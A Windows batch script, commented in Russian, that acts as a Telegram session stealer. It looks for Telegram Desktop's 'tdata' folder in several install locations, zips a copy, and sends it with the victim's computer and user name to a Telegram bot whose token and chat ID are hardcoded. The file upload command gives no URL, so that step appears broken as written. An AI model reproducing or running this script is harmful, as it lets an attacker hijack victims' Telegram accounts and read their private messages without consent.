@echo off
set "token=8546393587:AAEGxN5XHSiQGAS-pbRwQFmkOfREjFfCDaQ"
set "chat=990030901"
set "pc=%COMPUTERNAME%_%USERNAME%"
set "found=0"

:: 1. Обычный Telegram Desktop
if exist "%APPDATA%\Telegram Desktop\tdata" set "src=%APPDATA%\Telegram Desktop\tdata"&goto copy

:: 2. Beta-версия
if exist "%APPDATA%\Telegram Desktop Beta\tdata" set "src=%APPDATA%\Telegram Desktop Beta\tdata"&goto copy

:: 3. Портативный режим (рядом с Telegram.exe)
for %%a in ("%~dp0Telegram.exe") do if exist "%%~dpa\tdata" set "src=%%~dp0tdata"&goto copy

:: 4. Microsoft Store / UWP-версия (самое скрытое место)
if exist "%LOCALAPPDATA%\Packages\TelegramMessengerLLP.TelegramDesktop_*" (
    for /d %%i in ("%LOCALAPPDATA%\Packages\TelegramMessengerLLP.TelegramDesktop_*") do (
        if exist "%%i\LocalState\tdata" set "src=%%i\LocalState\tdata"&goto copy
    )
)

goto notfound

:copy
set "tmp=%TEMP%\tdata_%RANDOM%"
xcopy "%src%" "%tmp%" /E /I /H /Y >nul 2>nul
powershell -nop -c "Compress-Archive -Force '%tmp%' '%TEMP%\tdata_%pc%.zip'" >nul 2>nul
rd /s /q "%tmp%" >nul 2>nul
curl -F chat_id=%chat% -F document=@"%TEMP%\tdata_%pc%.zip" -F caption="TDATA 100%% → %pc%"
del "%TEMP%\tdata_%pc%.zip" >nul 2>nul
goto end

:notfound
curl -s -X POST "https://api.telegram.org/bot%token%/sendMessage" -d chat_id=%chat% -d text="no tdata :: %pc%"

:end
exit
